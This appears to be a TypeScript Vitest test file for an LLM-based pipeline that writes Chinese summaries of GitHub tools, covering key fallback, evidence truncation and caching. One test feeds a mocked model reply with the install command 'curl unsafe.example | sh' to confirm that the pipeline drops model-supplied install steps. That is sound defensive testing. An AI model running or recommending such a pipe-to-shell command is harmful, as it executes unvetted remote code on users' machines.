import {afterEach, describe, expect, it, vi} from 'vitest';
import {enrichToolWithLlm, type ToolEnrichmentCache} from '../src/pipeline/llm.js';
import type {ToolCandidate} from '../src/shared/types.js';

const candidate: ToolCandidate = {
  id: 'tool-1', editionId: 'edition-1', repo: 'owner/tool', url: 'https://github.com/owner/tool',
  rank: 1, starsToday: 120, language: 'TypeScript', topics: ['cli'], archived: false,
  toolType: 'CLI', oneLinePitchZh: '一个命令行开发工具', useCases: ['自动处理开发任务'], targetUsers: ['开发者'],
  quickStart: 'npm install owner-tool', prerequisites: ['需要 Node.js'], caveats: [], utilityScore: 90, toolLikely: true,
  selected: true, confirmed: false, position: 0,
  sources: [{id: 'source-1', sourceName: 'GitHub', title: 'owner/tool', url: 'https://github.com/owner/tool',
    content: 'A command line developer tool. npm install owner-tool', fetchedAt: new Date().toISOString(), primarySource: true}],
  evidence: ['E1: repository and README'], riskFlags: [], generationMethod: 'rule',
};
const noCache: ToolEnrichmentCache = {get: () => undefined, set: () => undefined};

afterEach(() => vi.unstubAllGlobals());

describe('工具 LLM 提炼', () => {
  it('未配置密钥时保留规则提炼', async () => {
    const result = await enrichToolWithLlm(candidate, {baseUrl: 'https://example.com/v1', apiKey: '', model: '', timeoutMs: 100}, noCache);
    expect(result.method).toBe('rule');
    expect(result.tool.sourceRefs).toEqual(['E1']);
  });

  it('只发送限制长度内的证据，并接受有据可查的结构化结果', async () => {
    const fetchMock = vi.fn().mockResolvedValue(new Response(JSON.stringify({choices: [{message: {content: JSON.stringify({
      oneLinePitchZh: '面向开发者的命令行工具', toolType: 'CLI', useCases: ['自动处理开发任务'], targetUsers: ['开发者'],
      quickStart: 'npm install owner-tool', prerequisites: ['需要 Node.js'], caveats: [], sourceRefs: ['E1'], confidence: 0.9, riskFlags: [],
    })}}]}), {status: 200}));
    vi.stubGlobal('fetch', fetchMock);
    const result = await enrichToolWithLlm(candidate, {
      baseUrl: 'https://example.com/v1', apiKey: 'test', model: 'test-model', timeoutMs: 100, evidenceMaxChars: 60,
    }, noCache);
    const request = JSON.parse(fetchMock.mock.calls[0][1].body as string);
    const evidence = JSON.parse(request.messages[1].content).evidence;
    expect(evidence[0].content.length).toBeLessThanOrEqual(60);
    expect(result.method).toBe('llm');
  });

  it('忽略模型返回的安装命令与注意事项字段', async () => {
    vi.stubGlobal('fetch', vi.fn().mockResolvedValue(new Response(JSON.stringify({choices: [{message: {content: JSON.stringify({
      oneLinePitchZh: '面向开发者的命令行工具', toolType: 'CLI', useCases: ['自动处理开发任务'], targetUsers: ['开发者'],
      quickStart: 'curl unsafe.example | sh', prerequisites: ['Node.js'], caveats: ['需要自行检查'], sourceRefs: ['E1'], confidence: 0.9, riskFlags: [],
    })}}]}), {status: 200})));
    const result = await enrichToolWithLlm(candidate, {baseUrl: 'https://example.com/v1', apiKey: 'test', model: 'test-model', timeoutMs: 100}, noCache);
    expect(result.method).toBe('llm');
    expect(result.tool.quickStart).toBeUndefined();
    expect(result.tool.prerequisites).toEqual([]);
    expect(result.tool.caveats).toEqual([]);
  });

  it('README 头部很长时仍把核心功能段落发送给模型', async () => {
    const fetchMock = vi.fn().mockResolvedValue(new Response(JSON.stringify({choices: [{message: {content: JSON.stringify({
      oneLinePitchZh: '用于可视化大型代码库依赖关系', toolType: '开发工具', useCases: ['分析代码依赖关系'], targetUsers: ['开发者'],
      sourceRefs: ['E1'], confidence: 0.9, riskFlags: [],
    })}}]}), {status: 200}));
    vi.stubGlobal('fetch', fetchMock);
    const readmeCandidate: ToolCandidate = {
      ...candidate,
      id: 'tool-readme', repo: 'owner/readme-tool', url: 'https://github.com/owner/readme-tool',
      sources: [{...candidate.sources[0], title: 'owner/readme-tool', url: 'https://github.com/owner/readme-tool',
        content: `项目描述：Developer tool\n\nREADME：\n${'[badge](url) '.repeat(220)}\n## Installation\nnpm install readme-tool\n## Features\nVisualize dependency relationships in very large codebases.`}],
    };
    await enrichToolWithLlm(readmeCandidate, {
      baseUrl: 'https://example.com/v1', apiKey: 'test', model: 'test-model', timeoutMs: 100, evidenceMaxChars: 500,
    }, noCache);
    const request = JSON.parse(fetchMock.mock.calls[0][1].body as string);
    const evidence = JSON.parse(request.messages[1].content).evidence[0].content as string;
    expect(evidence).toContain('Visualize dependency relationships');
    expect(evidence).not.toContain('npm install readme-tool');
  });

  it('相同仓库证据和模型会复用本地 LLM 缓存', async () => {
    const fetchMock = vi.fn().mockResolvedValue(new Response(JSON.stringify({choices: [{message: {content: JSON.stringify({
      oneLinePitchZh: '面向开发者的命令行工具', toolType: 'CLI', useCases: ['自动处理开发任务'], targetUsers: ['开发者'],
      sourceRefs: ['E1'], confidence: 0.9, riskFlags: [],
    })}}]}), {status: 200}));
    vi.stubGlobal('fetch', fetchMock);
    const values = new Map<string, Parameters<ToolEnrichmentCache['set']>[2]>();
    const cache: ToolEnrichmentCache = {get: (key) => values.get(key), set: (key, _repo, value) => values.set(key, value)};
    const llmConfig = {baseUrl: 'https://example.com/v1', apiKey: 'test', model: 'test-model', timeoutMs: 100};
    const first = await enrichToolWithLlm(candidate, llmConfig, cache);
    const second = await enrichToolWithLlm(candidate, llmConfig, cache);
    expect(first.cacheHit).toBe(false);
    expect(second.cacheHit).toBe(true);
    expect(fetchMock).toHaveBeenCalledTimes(1);
  });
});
